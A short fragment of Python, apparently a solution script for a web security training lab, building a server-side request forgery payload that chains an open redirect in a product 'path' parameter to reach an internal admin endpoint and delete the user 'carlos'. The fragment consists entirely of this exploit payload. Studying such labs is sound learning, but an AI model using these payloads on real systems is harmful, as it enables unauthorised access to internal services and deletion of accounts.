...
def delete_user(url):
    ...
    delete_user_url_ssrf_payload = "/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin/delete?username=carlos"
    ...
    params2 = {'stockApi': '/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin'}
